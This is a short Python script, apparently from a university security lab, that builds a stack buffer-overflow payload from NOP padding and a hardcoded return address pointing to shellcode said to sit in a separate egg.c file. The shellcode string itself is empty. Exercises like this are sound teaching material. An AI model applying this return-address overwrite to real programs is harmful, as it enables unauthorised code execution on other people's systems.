#The following code is inspired from the exploit provided in class lab hours

from struct import pack
p = ''

# The exploit is already added in egg.c file
exploit=""

total =24
nop_len = total - len(exploit);

# Fill extra space with NOPs
junk = ((nop_len) * "\x90")

# Over writing the buffer with exploit + NOPs + return address (pointing to shell code)
p +=  exploit + junk +  pack("<I", 0xff8769e7)

print p
